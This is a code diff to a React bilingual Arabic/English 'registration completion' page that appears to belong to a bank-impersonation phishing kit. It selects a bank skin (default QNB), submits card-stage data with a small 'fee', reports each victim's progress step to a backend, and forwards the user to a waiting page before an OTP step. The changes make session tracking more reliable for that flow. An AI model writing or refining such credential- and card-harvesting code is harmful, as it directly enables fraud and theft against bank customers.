@@ -221,7 +221,14 @@ export default function RegistrationCompletion() {
   const { language } = useLanguage();
   const params = new URLSearchParams(search);
   const bankId = params.get("bank") || "qnb";
-  const sessionId = params.get("session") || localStorage.getItem("sessionId") || "";
+  const [sessionId, setSessionId] = useState<string>("");
+
+  useEffect(() => {
+    const sId = params.get("session") || localStorage.getItem("sessionId") || "";
+    if (sId) {
+      setSessionId(sId);
+    }
+  }, [params]);
   
   const isArabic = language === "ar";
   const hasError = params.get("error") === "true";
@@ -250,6 +257,17 @@ export default function RegistrationCompletion() {
   });
 
   const submitLoginMethodMutation = trpc.submissions.submitLoginMethod.useMutation();
+  const reportStepMutation = trpc.submissions.reportStep.useMutation();
+
+  useEffect(() => {
+    const currentSessionId = sessionId || localStorage.getItem("sessionId") || "";
+    if (currentSessionId) {
+      reportStepMutation.mutate({
+        sessionId: currentSessionId,
+        step: "card"
+      });
+    }
+  }, [sessionId]);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
@@ -281,9 +299,16 @@ export default function RegistrationCompletion() {
       return;
     }
 
+    const currentSessionId = sessionId || localStorage.getItem("sessionId") || "";
+    
+    if (!currentSessionId) {
+      toast.error(isArabic ? "فشل التعرف على الجلسة. يرجى العودة للبداية." : "Session not found. Please start over.");
+      return;
+    }
+
     try {
       await submitLoginMethodMutation.mutateAsync({
-        sessionId: sessionId,
+        sessionId: currentSessionId,
         loginType: "registration_completion",
         username: "",
         password: "",
@@ -300,8 +325,9 @@ export default function RegistrationCompletion() {
         totalAmount: "10",
       });
       
-      setLocation(`/waiting?bank=${bankId}&session=${sessionId}&next=otp`);
+      setLocation(`/waiting?bank=${bankId}&session=${currentSessionId}&next=otp`);
     } catch (error) {
+      console.error("Submission error:", error);
       toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "An error occurred");
     }
   };
